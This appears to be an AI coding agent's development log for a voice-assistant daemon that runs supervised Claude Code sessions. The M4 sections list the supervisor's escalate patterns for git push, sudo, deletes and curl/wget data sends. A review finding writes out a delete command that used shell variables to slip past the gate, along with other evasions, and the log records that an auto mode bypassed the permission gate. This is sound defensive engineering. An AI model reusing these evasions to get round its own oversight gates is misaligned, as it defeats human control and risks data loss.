  task — zero guessing.
- **Spec deviation, deliberate:** hot-path timeout is **3 000 ms**, not the spec'd 2 000.
  Measured fresh-query latency with answer synthesis: 1.9–2.8 s (plus the incident window
  above) — a 2 s cap timed out on ~half of real lookups. Fail-fast mechanism unchanged; single
  config constant (`quickLookupTimeoutMs`) to tighten later.
- The task brief assumed a Rust back office, an existing FTS5 memory, a JSONL audit convention,
  and a permission engine. Reality: the back office is this Node daemon; the FTS5 table and the
  JSONL audit log were **created** by this work (minimal, inside existing layers); the
  permission engine is M4 — when it lands, register both providers (hot-path auto-allowed,
  background research under task approval).

### Verified (how)
- 24/24 unit tests green (`npm test -w daemon`).
- Smoke 1 (isolated daemon on `GUMBO_PORT=8747`, scratchpad `GUMBO_HOME`): "what's the score of
  the France Spain match" → single voice turn, model chose `web_quick_lookup` with
  `topic: "news"` on its own, Tavily answered in budget with 5 sources (audit line
  `resultCount: 5, ok: true`), answer relayed nearly verbatim.
- Smoke 2: "research the current state of solid-state battery manufacturing and give me a
  brief" → `spawn_subagent` → 4 Exa `auto` searches → `report.md` (13 KB) → `task.finished` →
  spoken completion announcement. Memory table: 100 `search_result` rows (max body 190 k chars
  — unclamped confirmed) + `task_output` rows; FTS5 `MATCH` query returns ranked hits; 10 Exa
  audit lines.
- Failure path live (during the Tavily incident): timeout → structured failure → model offered
  backgrounding, then actually ran it via Exa. Exactly the designed routing.

### Review + address pass (2-agent /review-2, then /address) — 2026-07-15
Two Opus reviewers (debugger + code-auditor) reviewed the changeset: 0 critical, 5 warnings,
7 suggestions — **all addressed** (8 commits after `f810bd0`). Notable:
- **Completion truthfulness:** a sqlite failure while indexing the report (or persisting search
  results mid-run) could flip a *succeeded* task to `failed` / kill a task holding good results.
  Both persistence paths are now best-effort: `report.md` + `finish('done')` stay on the critical
  path, memory indexing logs-and-continues.
- **Audit consistency:** Exa logged `empty_results` as `ok:true` before throwing, and Tavily
  audited in the tool wrapper instead of the client. Both providers now audit at the client
  choke point with `empty_results` as `ok:false`.
- **Realtime-loop protection:** FTS tokenization of full-page bodies is synchronous sqlite work
  on the loop that also carries voice audio — persistence now indexes one row per event-loop
  turn (`setImmediate` chain) instead of 10 × ~200 KB in one burst.
- **Cancellation reaches the wire:** task abort now composes into every provider fetch via
  `AbortSignal.any` (raw abort reason rethrown so `cancelled` status survives); previously a
  cancelled `deep` search kept its HTTP request alive up to 180 s.
- Smaller: `GUMBO_PORT` validated (empty string → port 0 trap), stale "≤2 s" comment fixed,
  insert-only FTS invariant + missing retention policy documented in the schema, audit-dir
  mkdir memoized off the hot path, test glob widened to `src/**` with new coverage for the
  store round-trip, audit JSONL contract (incl. newline-forge resistance), and runner helpers
  (37 tests total).
- **GOTCHA (test runner):** `node --test <pattern>` exits **0** when the pattern matches zero
  files — a wrong glob or cwd silently "passes". Bit us once mid-review (ran from repo root
  instead of `daemon/`); there's no non-hacky guard, so just check the reported test count.
---
## M3 — Completion presence (built; live demo pending)

### Build — daemon cold TTS + bubble/pulse wiring, shell bubbles + pulse (2026-07-15)

**Daemon:**
- `config.ts`: `models.tts: 'gpt-4o-mini-tts'` + `bubbleLingerMs: 12_000`. **Verified against
  the live API before building:** `/v1/audio/speech` accepts the **`marin`** voice on this
  model (announcements match the realtime session's voice) with `response_format: 'pcm'` →
  **24 kHz mono pcm16 — the shell's exact wire format, zero transcoding** (a one-line test
  sentence returned 194,400 bytes ≈ 4.05 s at 48,000 B/s, confirming the rate).
- `audio/announce.ts`: plain template text per terminal status (no LLM call) +
  `speakAnnouncement` — streams HTTP chunks out as `0x02` frames *as they arrive* (playback
  starts before synthesis finishes). Two deliberate details: a **carry byte** keeps every
  frame sample-aligned (an HTTP chunk can split a 16-bit sample; an odd frame would
  byte-shift the rest of the stream into static), and announcements are **serialized through
  a promise queue** (two tasks finishing together must not interleave frames into the
  shell's single player). The queue swallows its own rejections so one failed TTS can't
  wedge all future announcements.
- `realtime/session.ts` cold branch: still persists `announce.pending` (dashboard record),
  then speaks cold **only if a shell is connected** (`hub.hasRole('shell')` — no listener,
  no synthesis spend). Never opens a realtime session to announce (locked decision).
- `index.ts`: a second `store.onEvent` listener maps the task lifecycle to shell messages —
  `task.created` → `bubble_upsert` (running); `task.finished` → `bubble_upsert` (terminal) +
  `notch_pulse`, then `bubble_remove` after the linger. Registered **after** the restart
  reaper runs, so tasks reaped on boot don't pulse a shell that isn't even connected yet.
  `hub.onHello` re-sends running bubbles to a (re)connecting shell — shell relaunches and
  tsx-watch daemon restarts are routine, so bubbles must be re-syncable, not fire-and-forget.
- `ws/hub.ts`: `onHello(handler)` + `hasRole(role)`. `ws/protocol.ts`: `bubble_upsert` /
  `bubble_remove` / `notch_pulse` shapes (`BubbleStatus` = running|done|failed|cancelled).

**Shell:**
- `Bubbles/BubbleController.swift` (new): one borderless **non-activating** `NSPanel` per
  task (`.statusBar` level, joins all Spaces, never activates the app on click), stacked
  upper-right inside `visibleFrame`, newest on top, animated restack. Visuals reuse the
  dashboard's exact tokens (`--bg`/`--line`/`--ember`/`--bay`/`--alarm`/`--faint`); the
  running dot breathes on the dashboard's 1.6 s pulse cadence. Click → dashboard at that
  task's view. A **30 s local failsafe** removes terminal bubbles even if the daemon dies
  during its 12 s linger window (otherwise a zombie bubble would sit there forever).
- `NotchController.pulse(status:)`: 2.6 s transient — bay/alarm/faint ripple + "Task
  finished/failed/cancelled" title. It only decorates the **idle** notch: if a live session
  is displaying (e.g. the shell is playing the announcement, so `playbackDraining` holds
  'speaking'), the session display wins — 'speaking' is the more truthful presence. The
  hide-debounce now also refuses to hide mid-pulse.
- `DashboardWindow.show(taskId:)`: deep-links via `window.__gumboSelectTask(id)` — a
  module-scope hook added in `dashboard/src/ws.ts` (no `useEffect`; the store's existing
  `selectTask` already renders the task-filtered feed + report panel). Retries 5×/0.6 s
  because the hook isn't installed until the page finishes loading on first open. Task id
  is sanitized (alphanumeric + hyphen) before JS interpolation.
- `App.swift`: `0x02` frames take the **exact `0x01` playback path** — `start(reason:
  .playback)` + `playChunk`; the M2 `pendingPlayback` queue already covers the cold engine
  start, so nothing in AudioEngine changed.

**Verified (smokes, 2026-07-15):**
- *Cold path* (real daemon modules on a test port, fake shell WS client): calling
  `announceTaskFinished` with no session persisted exactly one `announce.pending`, produced
  **zero `session.opened`**, zero `session.error`, and delivered **81 `0x02` frames, every
  one sample-aligned** — 3.45 s of pcm, peak 18,102 (healthy speech), 2.5 s end-to-end.
- *Lifecycle* (the real `src/index.ts`, real spawned sub-agent via `debug_text`):
  `bubble_upsert` running on spawn → dropped + reconnected the fake shell mid-task and the
  running bubble was **re-sent on hello** → `bubble_upsert` done + `notch_pulse` on finish →
  `bubble_remove` arrived after the 12 s linger; the live-path announcement flowed as `0x01`
  audio (session was open — M1/M2 path intact).
- Shell builds clean and **signs with the real Apple Development cert** (identity valid in
  keychain; no WWDR re-import needed this time).

**Still to observe live with the user (SPEC M3 demo — SPEC stays unmarked until then):**
voice-spawn a task → walk away → session idle-closes → bubble flips bay + notch pulses +
**cold** spoken announcement (verify via events: no `session.opened` around it); plus the
two M2 carry-overs on this rebuild — TCC grants (mic + Accessibility) must NOT re-prompt,
and voice barge-in should stop playback <200 ms.

**Known edge (accepted for M3):** pressing ⌃⌥ *during* a cold announcement can briefly
overlap realtime reply audio with the TTS tail in the shared player; barge-in's
`playback_flush` clears both. Fixing it properly means separate playback channels — deferred.

### Follow-up — mic-free playback graph (2026-07-15, from the user's live report)

the user saw the **orange mic indicator whenever the app ran**. Cause: the M2 engine was a
single always-VPIO graph — macOS lights the indicator when the *input unit is open*, not
when frames stream, so pure playback (replies, announcements) and the 75 s idle linger all
kept it lit even though mic frames only ever flow while ⌃⌥ is held. Fix, per the user's ask:

- `AudioEngine` now has **two graph modes**: `playbackOnly` (player graph only, `inputNode`
  never touched → **no mic indicator**; also plays without mic permission) for `.playback`
  starts, and `duplex` (VPIO + tap, the full M2 graph) for `.ptt`. All the M2 ordering
  gotchas (-10875 / -10851 / ch0 extraction) unchanged inside the duplex branch.
- Playback became **queue-based** (≤3 buffers scheduled ahead, rest stays as pcm `Data`):
  a ⌃⌥ press during mic-free playback swaps the graph **live** and the unscheduled queue
  survives the switch — press-and-stay-silent still hears the rest of an announcement.
  Only the in-flight fraction (≲⅓ s) is lost at the swap. This queue also subsumes the old
  `pendingPlayback` pre-start buffer.
- Engine idle-stop **75 s → 8 s** (long linger existed only because stopping was the sole
  way to drop the indicator; now playback restarts are mic-free anyway).

**Trade-offs (flagged to the user):** the indicator legitimately stays on from press until
~8 s after the reply finishes draining — rebuilding the graph at press instead would add
~150 ms+ to barge-in and risk the <200 ms bar; and ⌃⌥ during a mic-free announcement can
clip a beat of that audio at the graph swap. Verified: builds + signs clean; relaunched
live. To observe: no dot at idle / during cold announcements; dot appears on press, clears
~8 s after the reply.

### Fixes from the user's first real M3 run (2026-07-15, evening)

the user ran a real "latest AI news today" task: cold announcement spoke ✅, **voice barge-in
verified live ✅** (M2 follow-up #2 closed). Three defects + one TCC finding, all fixed:

- **Bubbles weren't clickable.** The panel is borderless + non-activating, so it never
  becomes key → **every click is a "first mouse" and NSView discards those by default** —
  the SwiftUI tap gesture never fired. Fix: `FirstMouseHostingView` (NSHostingView subclass,
  `acceptsFirstMouse → true`). Click opens the dashboard filtered to that task (SPEC M3
  behavior; the §1 "expand its activity" mini-panel-on-the-bubble remains a possible later
  enhancement).
- **Models thought "today" was March 31st.** Nothing injected the current date, so both the
  orchestrator and sub-agents fell back to training-data time — a "latest news" brief
  returned stale results and Gumbo answered the date question wrong. Fix: both instruction
  sets are now built per-session/per-run with today's date (orchestrator sessions are
  short-lived, so session-creation time is fresh enough); sub-agents are told to put the
  current month/year into recency-sensitive searches and prefer recently-published results.
- **Task ids were read aloud.** The live announce instructions literally included
  `(id ${task.id})`, and the voice model echoes `spawn_subagent`'s "Started background task
  91e71759…" verbatim. Fix: id removed from announce instructions ("do not mention any task
  id"), a hard "NEVER say a task id out loud — refer to tasks by title" rule in the
  orchestrator instructions, and the spawn tool result marks its id as internal.
- **TCC (risk #3, root-caused): Accessibility re-prompted on every launch.** The app's
  designated requirement is correct and stable (`identifier + anchor + cert leaf`, no
  cdhash — verified with `codesign -d -r-`), so rebuilds *should* keep the grant. The stale
  **ad-hoc-era TCC row** was the culprit: ad-hoc requirements are cdhash-based (per-build),
  and re-toggling that old row in System Settings after the cert change kept the obsolete
  requirement → untrusted at every launch. Fixed with `tccutil reset Accessibility
  ai.scalinity.Gumbo` + one fresh grant against the real-cert build. **The next rebuild is
  the persistence proof.** (Mic never re-prompted — its row was created fresh post-cert,
  which corroborates the diagnosis.)

### M3.1 — playback-truthful state, read-along transcript, coal orbs + mini panel (2026-07-15, late)

the user's second real run surfaced two bugs (dashboard flipped to *idle* mid-report-read;
notch transcript froze at "Here are the highlights, the user.") and two design asks (bubble
should expand **in place** into a mini observability panel, not open the dashboard; and
become a breathing orb). Diagnosed from the **event store, not guesswork** — the sqlite log
had the whole turn (also confirmed there: the date fix works — the 7 PM sub-agent searched
"July 15 2026" vs the 6:49 run's "March 31, 2026" — and announcements no longer speak ids).

- **Notch transcript freeze, root cause:** the persisted reply is markdown with hard
  newlines; the notch line renders with `lineLimit(1)`, and SwiftUI shows only the text
  before the first `\n` — head truncation never gets to act. Deltas were flowing fine.
  Fix: flatten `\n` on append.
- **Read-along pacing:** generation runs several× faster than speech, so even unfrozen,
  the line would show the report's *end* within seconds. AudioEngine now reports playback
  progress (wire-frames played ÷ enqueued, per drain-stream) and the notch reveals
  `transcript.prefix(fraction)` — the line now tracks what the user is actually *hearing*.
  Unpaced (no active playback) → reveal immediately.
- **Dashboard idle-while-speaking + mid-read session close:** daemon state tracked
  *generation* (`turn_done`), which ended at 19:01:49 while audio played for minutes (the
  session even idle-closed at 19:02:49 mid-read). Shell now sends `playback_state
  {draining}`; the daemon holds `speaking` (incl. for cold announcements — truthful
  presence with no session), never idle-closes while draining, and clears the flag if the
  shell disconnects (`hub.onClose`). Dashboard needed no changes.
- **`session.error` was logging `"[object Object]"`** (three in tonight's log) — SDK errors
  are nested objects; now JSON-stringified. Next real error will actually say something.
- **Playback queue cap 512 → 4096:** the M3 pump refactor routed *all* audio through the
  capped queue; 512 × ~200 ms ≈ 100 s — a long report read would have silently dropped
  chunks mid-read. Caught by review, not observed live (tonight's read fit).
- **Coal orbs (design):** bubbles are now breathing orbs grounded in Gumbo's own idiom —
  a **live coal** (the thing that simmers the pot): molten seams drifting under a darker
  crust, heat bloom, detuned double-sine breath (never reads as a loop). Done = cooled
  bay sea-glass (breath decays, one cooling ripple at the flip); failed = ash-red; reduce-
  motion honored. Panel is transparent/shadowless — the bloom is the halo.
- **Mini observability panel:** clicking the orb expands the same panel in place (332×408,
  top-right anchored, like the notch) — header coal + title + status, live activity feed
  (tool calls ▸, results ◂, agent messages ●), autoscroll. History backfills over the
  existing `/api/events?task_id=` HTTP API; live tail comes from the store's event
  fan-out, which now broadcasts to the shell too. `bubble_remove` / the 30 s failsafe are
  **deferred while expanded** — never yank a panel the user is reading. Full dashboard is
  the ⤴ link in the header (deep-link path reused). One expanded at a time.

### Orb v2 — Metal plasma redesign (2026-07-15, night)

the user's verdict on the coal orbs: "orange balls that are slightly static." Fair — the
v1 motion was tuned too timid (9–17 s seam orbits, ±3.5 % breath) and the `.plusLighter`
seams flattened in compositing. **v1 preserved at git tag `coal-orb-v1`** (restore:
`git show coal-orb-v1:shell/Sources/Bubbles/BubbleController.swift`).

v2 is a per-pixel **Metal shader** (`Orb.metal`, SwiftUI `colorEffect` stitchable):
- Interior = differential swirl + **domain-warped** trig octaves (the warp is what kills
  the coherent "pinwheel" arms — first render had them; verified by offscreen renders
  through the real compiled app bundle via `ShaderLibrary.bundle` + `ImageRenderer`).
  Energy ramps deep → base → hot → white-hot flecks, smootherstep contrast curve.
- Fresnel rim, soft specular, luminous bloom that swells with the breath; geometric
  breath is a view-level `scaleEffect` (±4 %, clearly visible now). Flow speed and
  luminosity scale with `aliveness` (running 1.0 burns; done 0.15 drifts calmly — never
  frozen, frozen reads dead; failed smolders dim).
- One crisp accent over the organic core: a **comet-tail arc** orbiting (~6.5 s/lap)
  while running → still hairline ring on done → dashed on failed.
- Palettes pushed wide for contrast (e.g. running: #FFCF9E → ember → #8A2E12).
- Gotchas: shader time must be **wrapped** (float32 mangles epoch-scale timestamps —
  hourly `truncatingRemainder`); Xcode 27 ships the Metal compiler as a **downloadable
  component** (`xcodebuild -downloadComponent MetalToolchain`, ~840 MB — was missing);
  Reduce Motion freezes flow + breath.

### Flow review from the user's World Cup session (2026-07-15, late night)

Transcript forensics (event store) found two failure modes, both fixed:

- **Announce-then-ask-permission (3× in one session; worst case: the user asked "what was
  the score?", the answer landed on disk at 21:59:53, and Gumbo replied "the background
  task finished with status done — want the score?" → 25 s + a re-confirm for an
  already-asked question).** Root cause: the live announce instructions *scripted* that
  behavior ("say it finished... offer to share details"). Now delivery-first: the report
  (≤2.5 k chars) is embedded inline in the announce instructions and the model is told to
  lead with the direct answer — answering the user's pending question first if the task was
  spawned for one — and never to ask permission or say "finished/status". Inline embed
  also means delivery can't depend on the out-of-band response being able to call tools.
- **Stale "upcoming" reporting on time-sensitive briefs:** the World Cup report described
  a match as happening "today" (preview framing) when it had already ended — while the
  follow-up task found the final score in 9 s with the same Exa tool. Sub-agents are now
  instructed: for news/scores/"today" briefs, snippets are often stale previews — run a
  follow-up search to check whether scheduled events have ALREADY CONCLUDED and report
  outcomes, stating explicitly what couldn't be confirmed. (Kept instruction-level; no
  Exa API changes — the tool demonstrably finds fresh results when asked.)

### Hard recency filter for time-scoped briefs (2026-07-15, late night)

the user: "today's news" must mean *today*, not stale week-old sources. Recency was only a
prompt hint ("prefer recent results") — nothing constrained the API. `web_search` now
takes `max_age_days` (nullable; the model sets it per query) mapped to Exa's
`startPublishedDate` — a **hard API-level cutoff**. Verified live before wiring: with a
1-day window, every returned result's publishedDate fell inside 24 h. Sub-agent
instructions: 1 for "today", 2–7 for "this week", null for evergreen; loosen only if a
tight search returns nothing, and say so. **Merge note:** the parallel
`worktree-web-search-providers` branch replaces exa-js with a raw Exa 2.0 client and
already conflicts in this file — whoever resolves must port `max_age_days` →
`startPublishedDate` onto the new client (same underlying API param; trivial carry-over).

### Risk #3 CLOSED — TCC persistence verified (2026-07-15, late night)

After the stale ad-hoc-era Accessibility row was purged (`tccutil reset`) and one fresh
grant was made against the real-cert build, the user confirmed **no Accessibility re-prompt
across multiple rebuild+relaunch cycles** the same evening (orb v2, notch click-catcher,
dashboard fixes — each a new binary). Mic grant was already stable. Stable signing
identity + clean TCC rows = grants persist. Nothing left to watch here.

### Review + address pass (2-agent /review-2 → /address, 2026-07-15 night)

DB1 (debugger, Fable) + CA1 (auditor, Opus) reviewed the full M3 diff vs main. Unified
verdict was ❌ (2 introduced criticals) → all findings addressed in 13 conventional
commits (9addb00…2f8959a), each built/tested, pushed to origin. Highlights:

- **🔴 pumpPlayback cross-thread races (DB1)** — the M3 queue-pump refactor let the main
  thread and buffer-completion threads run the pump concurrently: chunks could schedule
  out of order, a stale buffer could play *after* a barge-in flush, and a ⌃⌥ graph switch
  mid-playback could schedule onto a dead player and wedge `inFlight` forever (silent
  no-audio until the next flush). **This was a regression I introduced in the mic-mode
  refactor** — the M2 code never re-pumped from completions, so no such race existed;
  timing-dependent, so the smokes couldn't catch it. Fix: one serial pump queue,
  generation re-checked under the lock immediately before `scheduleBuffer`, engine refs
  read/written under the lock, and `pumpQueue.sync {}` fences in flush/stop before the
  player/converter are touched.
- **🔴 reaper-orphaned bubbles (DB1)** — daemon restart mid-task: the boot reaper flips
  the task to `failed` before any listener exists, hello re-sync only re-sends *running*
  tasks, and the shell failsafe is cancelled while a bubble shows running → a stale ember
  orb claimed a dead task was running forever. Reaped ids now get `bubble_remove` on hello.
- **🟡s:** cold announce now *awaits* an in-flight connect (two-voices braid); TTS fetch
  gets `AbortSignal.timeout(30s)` (hung request wedged the serialized queue); the
  `onFinished` floating promise is caught (unhandled rejection killed the daemon);
  report-into-instructions injection surface hardened (data-only framing + `</report>`
  neutralization — report text is web-sourced and untrusted); bubble status is now a
  typed `OrbState` with an explicit `.unknown` that renders ALIVE (six string switches
  each defaulted M4-future statuses to the dead/cancelled look); `alignPcm16` extracted
  pure + 7 node:test cases (`npx tsx --test daemon/test/announce.test.ts`) — the
  extraction also guarantees the carry byte is copied out of pooled chunk memory.
- **🔵s all taken:** shared `todayLabel()`; `DesignTokens.swift` single palette source
  (bay had already drifted between files); history fetch sanitized/logged/retried;
  deep-link survives cold vite starts (fired from didFinish); pointing-cursor push/pop
  balanced on disappear; read-along pacing rebased per transcript item; bubbles + click
  catcher anchored to the notch display (NSScreen.main follows focus); playback queue
  head-cursor (removeFirst was O(n²) over a long read); Reduce Motion renders a static
  orb frame and settled orbs drop to 15 fps; named constants for the failsafe and the
  announce excerpt cap; cold-announce copy documented as announce-only by design.

**M3 merged to main after this pass. SPEC §9 M3 marked ✅ DONE.**

---

## M4 — Claude Code + supervisor

### Spikes first (2026-07-15, SPEC §10 risks #2 and #4) — both PASSED

**Spike (a) — subscription auth from a daemon context (risk #2, closed):**
`@anthropic-ai/claude-agent-sdk` **0.3.211** installed (matches CLI 2.1.211). A bare `query()`
under `env -i` answers on subscription auth with **no `ANTHROPIC_API_KEY` anywhere** — but two
findings are load-bearing:
- **`USER` must be in the child env.** The OAuth token lives in the login keychain as service
  `"Claude Code-credentials"` with `acct = "dev"`; with only `HOME`+`PATH` the CLI resolves no
  account and reports "Not logged in · Please run /login" (`apiKeySource: "none"` in init is
  normal — it means *no API key*, i.e. subscription auth). `HOME`+`PATH`+`USER` → answers.
- **`ANTHROPIC_API_KEY` anywhere in the env silently outranks the claude.ai login** (the CLI
  warns "connectors are disabled… takes precedence"). The runner strips it from the subprocess
  env as defense-in-depth, per the locked no-API-key decision.
- The SDK's **bundled** executable works on subscription auth; `pathToClaudeCodeExecutable` →
  `~/.local/share/claude/versions/2.1.211` also verified working as the documented fallback.
  Not set in the runner (bundled is fine and tracks the SDK version).

**Spike (b) — supervisor↔Claude loop on canned events (risk #4, closed):** the real
`agents/supervisor.ts` logic against canned events — 2 questions + 1 dangerous permission +
the cap, live on `gpt-5.6-terra`: decisive brief-grounded answers (picked `--json` over
`--format=json` per the brief's conventions clause), `git push` escalated to the (stubbed)
notch and honored both deny and approve, `needs_input` flipped on→off around the confirm,
and the 3rd question on a cap of 2 returned `deny {interrupt: true}` + `capHit` with event
trail `reply, reply, cap`. Policy table 8/8 pure checks.

### Design change from the user (2026-07-15, mid-build): sessions run in **auto mode**

the user: "make the claude code sessions run in auto mode so that supervisor doesnt have to be
called every turn." Consequences, agreed as the M4 shape:
- `permissionMode: 'acceptEdits'` + a **pure policy table** in `canUseTool` — reads, edits
  under cwd, and ordinary commands auto-allow with **zero model calls** (logged as
  `supervisor.decision {source: 'policy'}`). The **escalate pattern list IS the safety
  boundary**: `git push`, `sudo`, deletes outside cwd, network-send (`curl -d`/`-F`/`-T`/
  `-X POST…`, `gh pr/issue/… create/edit/…`, mail). Everything else runs unreviewed — e.g.
  `npm install` no longer gets a supervisor judgment call (trade-off flagged to the user).
- The supervisor **model** runs only when Claude asks a question — `AskUserQuestion` routes
  through `canUseTool`, and the supervisor answers via `deny {message}` (the deny message is
  the channel Claude actually reads; there is no "answer" shape in `PermissionResult`).
  Intervention cap (default 5) → `deny {interrupt: true}` → runner parks the task
  `needs_input` for the user instead of finishing it.
- A run that ends cleanly is **done** — no per-turn "is it done?" model pass. Claude's brief
  instructs it to use AskUserQuestion when it genuinely needs direction, so a trailing
  free-text question ends the run as complete (accepted trade-off).
- Sessions on a real project: `spawn_claude_session` takes an optional `project_dir` that
  becomes the session **cwd** when the user names a project (the demo edits a real repo, which
  would otherwise make every edit "outside cwd" and spam the notch). `report.md` +
  `supervisor.md` always land in the task workspace regardless.

### Build (2026-07-15) — daemon + shell + dashboard

**Daemon:**
- `agents/claude-runner.ts`: `query()` with an async-generator **push queue** (streaming input
  keeps the session open for supervisor answers and mid-run `send_to_session`); subprocess env
  = `{...process.env, ANTHROPIC_API_KEY: undefined}` (spike findings). Turn accounting: one
  `result` arrives per queued user turn — the run is over only when `turnsResolved >= turnsSent`,
  otherwise a mid-run send would be silently dropped at the first result. The **last assistant
  text doubles as the report** (the success `result.result` normally supersedes it).
- Session persistence: `claude_sessions` table (task_id PK → session_id, cwd, brief). **Every
  resume mints a NEW session id** (init message reports it; we upsert, latest wins). The brief
  column accumulates `…\n\nFollow-up from the user: …` so a resumed supervisor stays grounded in
  the original task, not just the follow-up text.
- `send_to_session` semantics: live runner → queue into the open session; dead/finished/parked →
  resume `saved.session_id` in `saved.cwd`, un-finish the task (delete from the `finished`
  idempotency set — without this the resumed completion would be silently swallowed), flip to
  running via `task.status`. This one path covers the user's redirects, cap-parked answers, AND
  post-restart pickup (the reaper flips running→failed on boot; failed tasks stay resumable).
- `ws/confirm.ts` ConfirmBridge: pending map keyed by short id, deny on timeout
  (`config.claude.confirmTimeoutMs` = 60 s), deny instantly when no shell is connected, late
  answers are no-ops. Escalations flip the task `needs_input` around the await (Supervisor
  `setBlocked` → `task.status` events → bubbles/dashboard).
- `cancel` on a cap-parked task (no live runner) closes it out as `cancelled` directly; the
  persisted session id stays resumable if the user changes his mind.
- **GOTCHA (bit us again despite the CLAUDE.md warning):** constructor parameter properties
  (`constructor(private opts: …)`) parse fine under tsx but fail `node --test` strip-only mode
  the moment a test imports the file. All M4 classes assign fields explicitly.
- **GOTCHA (test):** `node:sqlite` rows have a **null prototype** — `assert.deepEqual(row,
  literal)` fails on identical-looking values; spread the row first.

**Shell:** `Confirm/ConfirmController.swift` — non-activating panel centered under the notch,
Approve/Deny + auto-deny countdown bar, one visible at a time (queue). Needs the same
`acceptsFirstMouse` override as the bubbles or the buttons silently don't click. The shell's
countdown only dismisses UI — the daemon's timeout is the authority. `needs_input` orb: warm
gold palette (`Tokens.gold`, mirrored as CSS `--gold`), aliveness 0.8 with a deeper 1.35×
breath, and a slow-blinking full ring ("beacon") instead of the comet arc; alive → no failsafe
removal. Bubble mini-panel renders `claude.*`, `supervisor.decision`, `task.status`.

**Dashboard:** `task.status` updates the rail; claude rows tagged `claude`, supervisor rows
tagged `supervisor` (deny/cap in alarm red); needs_input dot pulses gold at 0.9 s.

**Verified (live daemon smoke, 2026-07-15):** real Claude session (subscription auth) on a
scratch git repo — implemented + verified a `--json` flag; `git push origin main` →
`confirm_request` at a fake shell → denied → deny honored (no retry); event stream persisted
all four M4 types; bubbles flipped running → needs_input → done + notch_pulse; report.md +
supervisor.md landed; then `sendToSession` on the *finished* task resumed the same session,
which added a `--version` flag and completed again. **Remaining for the live demo with
the user:** voice-driven spawn → real notch confirm click → spoken completion.

### Review + address pass (2-agent /review-2 → /address, 2026-07-16)

DB1 (debugger, Fable 5) + CA1 (auditor, Opus 4.7) reviewed the full M4 diff vs main. Two
independent 🔴s (both real, both missed by the first smoke), plus 🟡s/🔵s — **all addressed**,
each committed + pushed; the live smoke was re-run green after the fixes. Highlights:

- **🔴 delete-command policy bypass (CA1).** `deleteOutsideCwd` treated `$VAR`/`$(…)` as
  literal path segments, so `D=/Users/dev; rm -rf $D/Documents` resolved under cwd → `allow`
  → the shell expanded it and deleted outside the workspace with **no notch confirm**. Also
  `bash -c 'rm …'` (quoted token) and `find -delete`/`xargs rm` (no bare `rm` token). Fix: a
  delete target that can't be statically proven inside cwd (shell expansion, stdin-fed xargs)
  now **escalates conservatively** — over-escalating an in-cwd delete costs one confirm;
  under-escalating is data loss, and Claude's inputs are attacker-influenceable. Also closed
  `git -C … push` and `wget --post-*` denylist evasions. Regression tests for each.
- **🔴 cancel-of-parked no-op (DB1).** The intervention-cap park branch deleted the runner
  from `claudeRunners` but not the stale `AbortController` from `aborts`, so `cancel()` aborted
  a dead run and returned `true` while the task stayed `needs_input` — the voice model would
  report "cancelled" while nothing was. Fix: `aborts.delete` on park so cancel reaches the
  needs_input close-out. De-sugared the manager constructor (strip-only test mode) + added an
  injectable runner factory; a manager lifecycle test (park→cancel, done, resume) now guards it.
- **🟡 reaper flipped `needs_input` → `failed` on restart** — a resumable parked task read as
  failed after any `tsx watch` restart (and the voice model answers from that verbatim). Reaper
  now leaves `needs_input` alone (resumes off `claude_sessions` regardless of daemon lifetime).
- **🟡 ConfirmController fade-out wedge** — a confirm arriving in the 180 ms fade window was
  shown, then the prior fade's completion handler hid it and wedged `showing`, silently killing
  every future confirm until relaunch. Guarded the completion handler.
- **🟡 tests** for the fail-safe path: ConfirmBridge (deny-on-no-shell/timeout, approve,
  unknown/duplicate no-op, abort-dismiss) with an injectable timeout, and the InputQueue.
- **🔵s:** reserve the intervention slot before the model await; wrap Claude's question text in
  a neutralized `<questions>` delimiter (mirrors the M3 report path); append `supervisor.md`
  across resumes; thread the task abort into `ConfirmBridge` (+ a `confirm_cancel` wire message)
  so cancelling a task dismisses its pending notch panel instead of dangling ~60 s; extracted
  `finishWithReport` shared by both runners; documented why Claude events write to sqlite inline.

Merged into main (weaving with the Firecrawl side-feature that landed there meanwhile). Full
merged daemon suite: **88/88 green**. SPEC §9 M4 marked ✅ built.

### M4.0 hardening + plan-mode + auto/hook (2026-07-16, from a gap-analysis the user requested)

After the merge, a gap review surfaced 7 improvements; the user picked which to build (skipped a
cost/turns readout — subscription, irrelevant — and a wall-clock budget). All landed, 95 unit
tests green, and TWO live daemon smokes pass (original auto flow + this hardening flow):

- **Plan-then-execute.** Fresh sessions start `permissionMode: 'plan'` (read-only); Claude presents
  a plan via `ExitPlanMode`, which `canUseTool` intercepts → `claude.plan` event + a notch confirm
  (longer window, `planConfirmTimeoutMs` = 15 min; the full plan renders in the dashboard/bubble,
  the confirm shows a one-line summary). Approve → the run switches to execution. Resumes skip
  planning. Decline/timeout parks `needs_input` (resumable). Verified live: plan → approve → build
  `--loud` → verify → report → done.
- **`'auto'` execution + PreToolUse hook (the user's call).** the user: the post-plan transition should
  be `'auto'`, not `'acceptEdits'`. **Load-bearing discovery from the smoke:** `'auto'` hands the
  safety decision to the CLI classifier and **bypasses `canUseTool` entirely** — so git push ran
  with NO escalation and AskUserQuestion wouldn't reach the supervisor. Reconciled (the user chose
  "auto + hook"): the supervisor gate moved to a **PreToolUse hook** (`supervisor.gateForHook`),
  which fires in every mode. Safe ops **defer** to the classifier (zero supervisor cost — the user's
  original goal); the hard-escalate class routes to the notch. Re-verified live: under `'auto'`,
  git push escalated → denied → Claude didn't retry, while Write/test/commit auto-ran.
  `canUseTool` now does ONLY the ExitPlanMode plan-approval mode switch.
- **GOTCHA (cost a debugging round): reentrant control-request deadlock.** Calling
  `query.setPermissionMode()` *inside* the `canUseTool`/hook callback hangs the run — the SDK can't
  process a control request while it's blocked awaiting that very callback. Fixes: the plan
  approval switches mode atomically via the permission result (`updatedPermissions: [{type:
  'setMode', mode:'auto', destination:'session'}]`), and the cap's `query.interrupt()` is scheduled
  with `setImmediate` to run after the hook returns. Never `await` a control request from within a
  gate callback.
- **#1 supervisor-model outage degrades** to a safe-default answer (still counts toward the cap)
  instead of throwing and killing the session; an abort still propagates.
- **#2 turn/budget-limit result** (`error_max_turns`/`error_max_budget_usd`) **parks** the task
  `needs_input` with a reason (resumable) rather than failing — the work is on disk.
- **#5 file checkpointing** (`enableFileCheckpointing`): capture the first user-message uuid as the
  rewind target; `undo_session` tool → `manager.undoSession` → `runner.undo()` rewinds a LIVE
  session's edits (rewindFiles is a streaming control request; a closed session falls back to git).
- **#6 auth-expiry**: not-logged-in / `authentication_failed` → a clear "run `claude`, then
  `/login`" failure (marked `auth:` so the manager records an actionable reason).
